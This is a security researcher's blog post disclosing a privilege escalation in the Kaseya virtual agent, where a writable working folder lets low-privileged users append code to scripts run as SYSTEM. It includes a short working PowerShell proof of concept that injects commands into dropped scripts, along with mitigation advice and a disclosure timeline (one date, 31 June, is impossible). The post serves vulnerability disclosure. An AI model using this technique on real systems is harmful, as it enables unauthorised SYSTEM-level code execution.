---
layout: post
title: Kaseya privilege escalation
---

<h3>Introduction</h3>
<p>
So this is the first time I've written about a security issue I've found.
I decided to write about this as the vendor was unresponsive and looking their product CVEs it seems to be a
common place. The other reason is that if an organisation is using this product, most of their machines are at risk. 

So I give you Kaseya virtual agent.
</p>

<h3>Product</h3>
<h4>Windows 10. Agent version <= 9.5</h4>
<p>
Kaseya virtual agent provides a web application interface for managing and monitoring IT assets via its deployed agents.
Its a competitor for Microsoft system centre and has a small portion of the market when compared with other vendors.
The agent itself looks to be a several tools bundled together instead of a dedicated agent leveraging host capabilities such as PowerShell, WScript as well as a couple of binaries like curl which are dropped.
</p>
  
<h3>Vulnerability</h3>
<p>
This is not really a new issue as such but more an extension of <a href="https://www.securityfocus.com/archive/1/541884/30/300/threaded">CVE-2017-12410</a> found by Filip Palian.
Where a fix was put in place for the original issue it was specific to binaries and not scripts.
The root cause for both issues is a low privileged group with excessive permissions to a folder used by a elevated process.

The Kaseya agent runs as SYSTEM by default.
The agent also has a default working folder @ <code class="highlighter-rouge">c:\kworking</code>.
It will pull scripts and binaries to this folder and execute them from disk from the controlling web application.
By default the <code class="highlighter-rouge">Authenticated Users</code> group has all rights to this folder.

Scripts are written to disk however they are not checked for integrity prior to execution.
So a folder can be monitored for script files being dropped and then append malicious code prior to execution.
</p>

<h3>Impact</h3>
<p>
Given that the Kaseya virtual agent is an asset management tool, if the agent is deployed on a single machine within an organisation there is a good chance it has been deployed across the majority of the systems. The vulnerability itself is reliant on code execution within the working folder and depends on scheduled tasks or ad-hoc script execution from the web interface, so the wait time can vary.

So this is case by case based on script usage via agents within the organisation.
</p>

<h3>Proof of concept</h3>
This PowerShell script will use a file monitor against the default working directory.
When a ps1 script drops it will then append the command "Write-Host 'injected content'" which will run as SYSTEM.

<pre>
  <code>
      $folder = 'c:\kworking' 
      $filter = '*.ps1'                          

      $filesystem = New-Object IO.FileSystemWatcher $folder, $filter -Property @{IncludeSubdirectories = $false;NotifyFilter =  [IO.NotifyFilters]'FileName, LastWrite'}

      Register-ObjectEvent $filesystem Created -SourceIdentifier FileCreated -Action { 
          $path = $Event.SourceEventArgs.FullPath 
          "`nWrite-Host 'injected content'" | Out-File -Append -FilePath $path -Encoding utf8 
          Unregister-Event FileCreated
      }
  </code>
</pre>

Change the Write-Host command to the code to be executed or update the script to target other script drops such as vb script.
</p>

<h3>Mitigation</h3>
<p>
All scripts should be signed and verified prior to execution eliminating the ability to append arbitrary commands. Additionally Kaseya should remove the excessive privileges on the working directory. 
Removing <code class="highlighter-rouge">Authenticated Users</code> permissions to write/append would be another step forward though I am unsure of the impact of the Kaysea product.
</p>

<h3>Timeline</h3>
<ul>
  <li>16-06-2019 :: Issue found</li>
  <li>18-06-2019 :: security@ emailed requesting steps to disclose</li>  
  <li>30-06-2019 :: CERT contacted due to non response of vendor from official email address</li>
  <li>31-06-2019 :: CERT still unable to contact vendor</li>
  <li>07-07-2019 :: CERT makes contact with vendor. Discover security@ address is not monitored by vendor</li>
  <li>20-08-2019 :: Vendor confirms receipt of details</li>
  <li>27-08-2019 :: Email sent indicating intention to disclose due to lack of response</li>
</ul>
